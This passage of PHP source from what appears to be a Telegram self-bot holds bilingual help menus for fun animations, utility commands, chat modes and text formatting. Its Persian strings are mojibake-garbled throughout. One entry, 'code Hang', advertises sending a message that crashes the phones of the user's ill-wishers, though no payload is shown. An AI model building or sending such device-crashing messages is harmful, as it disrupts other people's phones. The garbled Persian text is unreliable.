โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ููุจ</code>  
ุฑูุต ููุจ ูุง ๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ููุจุฒ</code>  
ุฑูุต ููุจ ูุง ?ฒ ๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ูฺฉุนุจ</code>  
ุฑูุต ูฺฉุนุจ ูุง ?ฒ ๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ูุฑุจุน</code>  
ุฑูุต ูุฑุจุน ูุง ๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>Corona</code> 
ฺฉูุฑููุง ุงููุฏู๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ฺฉุงฺฉุชูุณ</code> 
ฺฉุงฺฉุชูุณ ู ุจุงุฏุจุงุฏฺฉ ๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>vizviz</code> 
 ุฒูุจูุฑ ู ุงูุณุงู ุจ? ููุง ๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>vizviz2</code> 
ุฒูุจูุฑ ู ุงูุณุงู ุจ? ููุง ๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>car </code>  
 ุงููุฌุงุฑ ูุงุด?ู๐ฅ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>Clock</code>  
 ุฑูุต ุณุงุนุช โ๏ธ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>motor</code>  
  ููุชูุฑ ู ุงููุฑุจุง  ๐งฒ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ุงุจุฑ</code> 
 ุฑุนุฏ ูุจุฑูโก๏ธ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ุจุงุฑูู</code> 
 ุจุงุฑูู ู?ุงุฏ๐ง
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ุนุดู</code> 
 ูุดุงู ุฏุงุฏู ุนุดู๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ุนุดู ุฏู</code> 
 (2) ูุดุงู ุฏุงุฏู ุนุดู๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ  <code>moc</code>   
 ูฺฉุนุจ ูุง? ุฑูฺฏ? ุฑ?ุฒ๐ช
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ูุฑุบ</code> 
  ุฏู?ุฏู ูุฑุบ ๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ุฎูุฏู</code> 
ููุง?? ุงุฒ ุณ?ุณ ุฎูุฏู ๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ุชุงูฺฉ</code> 
ุชุตู?ุฑ ?ณุจุนุฏ? ุชุงูฺฉ โจ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ูฺฉ</code> 
ูฺฉ ฺฉู ๐ฅ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>love3</code> 
ุชุตู?ุฑ ุนุดู ๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ุฏุง?ูุงุณูุฑ</code> 
ุชุตู?ุฑ ?ณุจุนุฏ? ุฏุง?ูุงุณูุฑ ๐ฆ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ุฏููุช ุณุฑู?ุณ</code> 
ุฏููุช ุณุฑู?ุณ ุฏุงุฏุงุด ๐คฃ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ูฺฉ ฺฉุฑุฏู</code> 
ูฺฉ ฺฉุฑุฏู ุจู?ู ๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>code Hang</code>
ุจุฑุง? ููฺฏ ฺฉุฑุฏู ฺฏูุด? ุจุฏุฎูุงูุชูู๐ฑ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ุฑูุงู?</code>
ุฏ?ูุงูู ู ุฑูุงู?๐คช
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ <code>ฺฉุฑุฌ</code> 
ฺฉุฑุฌ๐ค
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐ด แดษชษดษข แดษดแด สแดแดแด ษขแดษชแดแด ๐ด
 
๐ฑ สแดแด แด๊ฑแด : $mem_using แดส ๐ฑ
๐ก แดษชษดษข สแดแดแดแดแด : $load[0] ๐ก
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
",
                            'parse_mode' => 'Markdown']);
                    }
                    if (preg_match("/^[\/\#\!]?(funhelp2)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๊ฑแดส๊ฐ สแดแด ๊ฐแดษด สแดสแด2
โขยป Applied and entertainment tools ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป wiki (text) ยซโข
โขยป Search Wikipedia ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /weather City Name ยซโข
โขยป Get the weather of your favorite city ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /music  [Text] ยซโข
โขยป Favorite music ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /info  [@username] ยซโข
โขยป User information with ID ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป gpinfo ยซโข
โขยป Get group information ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /sessions ยซโข
โขยป Receive active account sessions ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /save  [Replay] ยซโข
โขยป Save the text of the file and everything else in the robot (cloud) ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /id  [Replay] ยซโข
โขยป Receive a person's numeric ID with Replay ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป pic (Text) ยซโข
โขยป Get text related photos ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป gif (Text) ยซโข
โขยป Get text related gifs ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /joke ยซโข
โขยป Random jokes ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป like (Text) ยซโข
โขยป Create text with the Like button ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป search (Text) ยซโข
โขยป Search your text and group ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป ุณุงุนุช ยซโข
โขยป Receive accurate time up to 60 seconds ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป ุชุงุฑ?ุฎ ุดูุณ? ยซโข
โขยป Receiving solar history ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป ุชุงุฑ?ุฎ ู?ูุงุฏ? ยซโข
โขยป Get the Gregorian date ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โฃ แดษชษดษข แดษดแด สแดแดแด ษขแดษชแดแด 
 
แดแดแดแดษดแด แด๊ฐ สแดแด ษชษด แด๊ฑแด : $mem_using แดส
แดษชษดษข สแดแดแดแดแด ๊ฑแดสแด แดส : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๊ฑแดส๊ฐ สแดแด ๊ฐแดษด สแดสแด2
โขยป ุงุจุฒุงุฑ ฺฉุงุฑุจุฑุฏ? ู ุณุฑฺฏุฑู? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป wiki (text) ยซโข
โขยป ุฌุณุชุฌู ุฏุฑ ู?ฺฉ? ูพุฏ?ุง ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /weather ุงุณู ุดูุฑ ยซโข
โขยป ุฏุฑ?ุงูุช ูุถุน?ุช ููุง? ุดูุฑ ุฏูุฎูุงู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /music  [ูุชู] ยซโข
โขยป ููุณ?ู? ุฏูุฎูุงู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /info  [@username] ยซโข
โขยป ุงุทูุงุนุงุช ฺฉุงุฑุจุฑ ุจุง ุง?ุฏ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป gpinfo ยซโข
โขยป ุฏุฑ?ุงูุช ุงุทูุงุนุงุช ฺฏุฑูู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /sessions ยซโข
โขยป ุฏุฑ?ุงูุช ูุดุตุช ูุง? ูุนุงู ุงฺฉุงูุช ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /save  [ุฑ?ูพู?] ยซโข
โขยป ุฒุฎ?ุฑู ฺฉุฑุฏู ูุชู ูุง?ู ู ูุฑฺ?ุฒ ุฏ?ฺฏุน? ุชู ูพ?ู? (ูุถุง? ุงุจุฑ? ) ุฑุจุงุช ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /id  [ุฑ?ูพู?] ยซโข
โขยป ุฏุฑ?ุงูุช ุง?ุฏ? ุนุฏุฏ? ุดุฎุต ุจุง ุฑ?ูพู? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป pic (ูุชู) ยซโข
โขยป ุฏุฑ?ุงูุช ุนฺฉุณ ูุฑุชุจุท ุจุง ูุชู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป gif (ูุชู) ยซโข
โขยป ุฏุฑ?ุงูุช ฺฏ?ู ูุฑุชุจุท ุจุง ูุชู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /joke ยซโข
โขยป ุฌูฺฉ ุจุตูุฑุช ุฑูุฏูู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป like (ูุชู) ยซโข
โขยป ุณุงุฎุช ูุชู ุจููุฑุงู ุฏฺฉูู ? ูุง?ฺฉ ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป search (ูุชู) ยซโข
โขยป ุฌุณุชุฌู? ูุชู ุชู ูพ?ู? ู ฺฏุฑูู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป ุณุงุนุช ยซโข
โขยป ุฏุฑ?ุงูุช ุณุงุนุช ุฏู?ู ุชุง 60 ุตุงู?ู ุจุฑูุฒ ู?ุดู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป ุชุงุฑ?ุฎ ุดูุณ? ยซโข
โขยป ุฑ?ุงูุช ุชุงุฑ?ุฎ ุดูุณ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป ุชุงุฑ?ุฎ ู?ูุงุฏ? ยซโข
โขยป ุฏุฑ?ุงูุช ุชุงุฑ?ุฎ ู?ูุงุฏ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โฃ แดษชษดษข แดษดแด สแดแดแด ษขแดษชแดแด 
 
แดแดแดแดษดแด แด๊ฐ สแดแด ษชษด แด๊ฑแด : $mem_using แดส
แดษชษดษข สแดแดแดแดแด ๊ฑแดสแด แดส : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(actionshelp)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๊ฑแดส๊ฐ สแดแด แดแดแดษชแดษด๊ฑสแดสแด
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>typing on</code> Or <code>typing off</code> ยซโข
โขยป Turn on (off) mode in the group after each message  ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>videoaction on</code> Or <code>videoaction off</code> ยซโข
โขยป  Turn off video recording mode ๐
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>audioaction on</code>  Or <code>audioaction off</code> ยซโข
โขยป Turn sound recording mode on and off ๐ค
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>gameplay on</code> Or <code>gameplay off</code> ยซโข
โขยป Turn game mode on and off ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>markread</code>  on Or <code>markread off</code> ยซโข
โขยป Turn automatic mode on and off ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>poker  on</code> Or <code>poker off </code> ยซโข
โขยป Turn poker mode on and off (wherever you see poker, the iplay method ๐) ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>echo on</code> Or <code>echo off</code> ยซโข
โขยป Turn echo mode on or off (any message in the chat or in the document prompts immediately)
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>lockpv on</code> Or <code>lockpv off</code> โ
โขยป When you turn on this mode, anyone who sends a message will be blocked! ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>autochat on</code> Or <code>autochat off</code> ยซโข
โขยป Auto Chat mode! ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โฃ แดษชษดษข แดษดแด สแดแดแด ษขแดษชแดแด 
 
แดแดแดแดษดแด แด๊ฐ สแดแด ษชษด แด๊ฑแด : $mem_using แดส
แดษชษดษข สแดแดแดแดแด ๊ฑแดสแด แดส : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๊ฑแดส๊ฐ สแดแด แดแดแดษชแดษด๊ฑสแดสแด
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>typing on</code> ?ุง <code>typing off</code> ยซโข
โขยป ุฑูุดู ู ุฎุงููุด ฺฉุฑุฏู ุญุงูุช (ุฏุฑุญุงู ููุดุชู)ุชู ฺฏุฑูู ุจุนุฏ ุงุฒูุฑูพ?ุงู  ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>videoaction on</code> ?ุง <code>videoaction off</code> ยซโข
โขยป  ุฑูุดู ุฎุงููุด ฺฉุฑุฏู ุญุงูุช ุธุจุท ู?ุฏ?ู ๐
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>audioaction on</code>  ?ุง <code>audioaction off</code> ยซโข
โขยป ุฑูุดู ู ุฎุงููุด ฺฉุฑุฏู ุญุงูุช ุธุจุท ุตุฏุง ๐ค
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>gameplay on</code> ?ุง <code>gameplay off</code> ยซโข
โขยป ุฑูุดู ู ุฎุงููุด ฺฉุฑุฏู ุญุงูุช ุจุงุฒ? ๐ฎ
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>markread</code>  on ?ุง <code>markread off</code> ยซโข
โขยป ุฑูุดู ู ุฎุงููุด ฺฉุฑุฏู ุญุงูุช ุณ?ู ุฎูุฏฺฉุงุฑ ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>poker  on</code> ?ุง <code>poker off </code> ยซโข
โขยป ุฑูุดู ู ุฎุงููุด ฺฉุฑุฏู ุญุงูุช ูพูฺฉุฑ(ูุฑุฌุง ูพูฺฉุฑ ุจุจ?ูู ุฑูุด ุฑ?ูพู? ู?ุฒูู ๐) ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>echo on</code> ?ุง <code>echo off</code> ยซโข
โขยป ุฑูุดู ?ุง ุฎุงููุด ฺฉุฑุฏู ุญุงูุช ุทูุท? (ูุฑูพ?ุงู? ุฏุฑ ฺฏูพ ?ุง ูพ?ู? ุณูุฏ ุจุดู ูููู ุฑู ููุฑ ู?ฺฉูู)
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>lockpv on</code> ?ุง <code>lockpv off</code> โ
โขยป ููุช? ุง?ู ุญุงูุช ุฑู ุฑูุดู ฺฉู?ุฏ ูุฑฺฉุณ? ูพ?ู? ูพ?ุงู ุจุฏู ุจูุงฺฉ ู?ุดู! ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>autochat on</code> ?ุง <code>autochat off</code> ยซโข
โขยป ุญุงูุช ูพุงุณุฎฺฏู?? ุฎูุฏฺฉุงุฑ! ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โฃ แดษชษดษข แดษดแด สแดแดแด ษขแดษชแดแด 
 
แดแดแดแดษดแด แด๊ฐ สแดแด ษชษด แด๊ฑแด : $mem_using แดส
แดษชษดษข สแดแดแดแดแด ๊ฑแดสแด แดส : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(timehelp)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
โชโโโโโโโโโโโโโโโโโโโโซ 
โ******๊ฑแดส๊ฐ สแดแด แดษชแดแดสแดสแด******โ
โชโโโโโโโโโโโโโโโโโโโโซ 
โขยป <code>timename on</code> ยซโข
โขยป Turn the clock on in the name ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>timename off</code> ยซโข
โขยป Turn the clock off in the name ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>timebio on</code> ยซโข
โขยป Turn the clock on in the bio ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>timebio off</code> ยซโข
โขยป Turn the clock off in the bio ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>timepic on</code> ยซโข
โขยป Turn the clock on in your profile picture ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>timepic off</code> ยซโข
โขยป Turn the clock off in your profile picture ยซโข
โชโโโโโโโโโโโโโโโโโโโโซ 
โจ สแดแด แด๊ฑแด : $mem_using แดส โจ
โจ แดษชษดษข สแดแดแดแดแด : $load[0] โจ
โชโโโโโโโโโโโโโโโโโโโโซ  
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
โชโโโโโโโโโโโโโโโโโโโโซ 
โ******๊ฑแดส๊ฐ สแดแด แดษชแดแดสแดสแด******โ
โชโโโโโโโโโโโโโโโโโโโโซ 
โขยป <code>timename on</code> ยซโข
โขยป ุฑูุดู ฺฉุฑุฏู ุณุงุนุช ุฏุฑ ุงุณู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>timename off</code> ยซโข
โขยป ุฎุงููุด ฺฉุฑุฏู ุณุงุนุช ุฏุฑ ุงุณู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>timebio on</code> ยซโข
โขยป ุฑูุดู ฺฉุฑุฏู ุณุงุนุช ุฏุฑ ุจ?ู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>timebio off</code> ยซโข
โขยป ุฎุงููุด ฺฉุฑุฏู ุณุงุนุช ุฏุฑ ุจ?ู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>timepic on</code> ยซโข
โขยป ุฑูุดู ฺฉุฑุฏู ุนฺฉุณ ุฏุงุฑุง? ุณุงุนุช ุฏุฑ ูพุฑููุง?ู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>timepic off</code> ยซโข
โขยป ุฎุงููุด ฺฉุฑุฏู ุนฺฉุณ ุฏุงุฑุง? ุณุงุนุช ุฏุฑ ูพุฑููุง?ู ยซโข
โชโโโโโโโโโโโโโโโโโโโโซ 
โจ สแดแด แด๊ฑแด : $mem_using แดส โจ
โจ แดษชษดษข สแดแดแดแดแด : $load[0] โจ
โชโโโโโโโโโโโโโโโโโโโโซ  
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(texthelp)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
โชโโโโโโโโโโโโโโโโโโโโซ 
โ******๊ฑแดส๊ฐ สแดแด แดแดxแดสแดสแด******โ
โชโโโโโโโโโโโโโโโโโโโโซ 
โโขยป <code>hashtag on</code> ยซโข
โ โขยป Turn off hashtag mode ยซโข
โ
โ โขยป <code>hashtag off</code> ยซโข
โ โขยป Turn on hashtag mode ยซโข
โ
โ โขยป <code>bold on</code> ยซโข
โ โขยป Turn on text thickening mode ยซโข
โ
โ โขยป <code>bold off</code> ยซโข
โ โขยป Turn off text thickening mode ยซโข
โ
โ โขยป <code>strikethrough on</code> ยซโข
โ โขยป Turn on strikethrough mode ยซโข
โ
โ โขยป <code>strikethrough off</code> ยซโข
โ โขยป Turn off strikethrough mode ยซโข
โ
โ โขยป <code>italic on</code> ยซโข
โ โขยป Turn on italic mode ยซโข
โ
โ โขยป <code>italic off</code> ยซโข
โ โขยป Turn off italic mode ยซโข
โ
โ โขยป <code>underline on</code> ยซโข
โ โขยป Turn on underline mode ยซโข
โ
โ โขยป <code>underline off</code> ยซโข
โ โขยป Turn off underline mode ยซโข
โ
โ โขยป <code>part on</code> ยซโข
โ โขยป Turn on message editing mode ยซโข
โ
โ โขยป <code>part off</code> ยซโข
โ โขยป Turn off message editing mode ยซโข
โ
โ โขยป <code>coding on</code> ยซโข
โ โขยป Turn on code writing mode ยซโข
โ
โ โขยป <code>coding off</code> ยซโข
โ โขยป Turn off code writing mode ยซโข
โ
โ โขยป <code>mention on</code> ยซโข
โ โขยป Turn on mention mode ยซโข
โ
โ  โขยป <code>mention off</code> ยซโข
โโขยป Turn on mention mode ยซโข
โชโโโโโโโโโโโโโโโโโโโโซ 
โจ สแดแด แด๊ฑแด : $mem_using แดส โจ
โจ แดษชษดษข สแดแดแดแดแด ๊ฑแดสแด แดส : $load[0] โจ
โชโโโโโโโโโโโโโโโโโโโโซ  
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
โชโโโโโโโโโโโโโโโโโโโโซ 
โ******๊ฑแดส๊ฐ สแดแด แดแดxแดสแดสแด******โ
โชโโโโโโโโโโโโโโโโโโโโซ 
โขยป <code>hashtag on</code> ยซโข
โขยป ุฑูุดู ฺฉุฑุฏู ุญุงูุช ูุดุชฺฏ ูู?ุณ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>hashtag off</code> ยซโข
โขยป ุฎุงููุด ฺฉุฑุฏู ุญุงูุช ูุดุชฺฏ ูู?ุณ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>bold on</code> ยซโข
โขยป ุฑูุดู ฺฉุฑุฏู ุญุงูุช ุจููุฏ ูู?ุณ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>bold off</code> ยซโข
โขยป ุฎุงููุด ฺฉุฑุฏู ุญุงูุช ุจููุฏ ูู?ุณ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>strikethrough on</code> ยซโข
โขยป ุฑูุดู ฺฉุฑุฏู ุญุงูุช strikethrough ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>strikethrough off</code> ยซโข
โขยป ุฎุงููุด ฺฉุฑุฏู ุญุงูุช strikethrough ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>italic on</code> ยซโข
โขยป ุฑูุดู ฺฉุฑุฏู ุญุงูุช ฺฉุฌ ูู?ุณ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>italic off</code> ยซโข
โขยป ุฎุงููุด ฺฉุฑุฏู ุญุงูุช ฺฉุฌ ูู?ุณ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>underline on</code> ยซโข
โขยป ุฑูุดู ฺฉุฑุฏู ุญุงูุช ุฒ?ุฑุฎุท ูู?ุณ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>underline off</code> ยซโข
โขยป ุฎุงููุด ฺฉุฑุฏู ุญุงูุช ุฒ?ุฑุฎุท ูู?ุณ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>part on</code> ยซโข
โขยป ุฑูุดู ฺฉุฑุฏู ุญุงูุช ุช?ฺฉู ุช?ฺฉู ูู?ุณ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>part off</code> ยซโข
โขยป ุฎุงููุด ฺฉุฑุฏู ุญุงูุช ุช?ฺฉู ุช?ฺฉู ูู?ุณ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>coding on</code> ยซโข
โขยป ุฑูุดู ฺฉุฑุฏู ุญุงูุช ฺฉุฏ ูู?ุณ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>coding off</code> ยซโข
โขยป ุฎุงููุด ฺฉุฑุฏู ุญุงูุช ฺฉุฏ ูู?ุณ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>mention on</code> ยซโข
โขยป ุฑูุดู ฺฉุฑุฏู ุญุงูุช ููุดู ูู?ุณ? ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>mention off</code> ยซโข
โขยป ุฎุงููุด ฺฉุฑุฏู ุญุงูุช ููุดู ูู?ุณ? ยซโข
โชโโโโโโโโโโโโโโโโโโโโซ 
โจ สแดแด แด๊ฑแด : $mem_using แดส โจ
โจ แดษชษดษข สแดแดแดแดแด ๊ฑแดสแด แดส : $load[0] โจ
โชโโโโโโโโโโโโโโโโโโโโซ  
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(spamhelp)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๊ฑแดส๊ฐ สแดแด ๊ฑแดแดแดสแดสแด
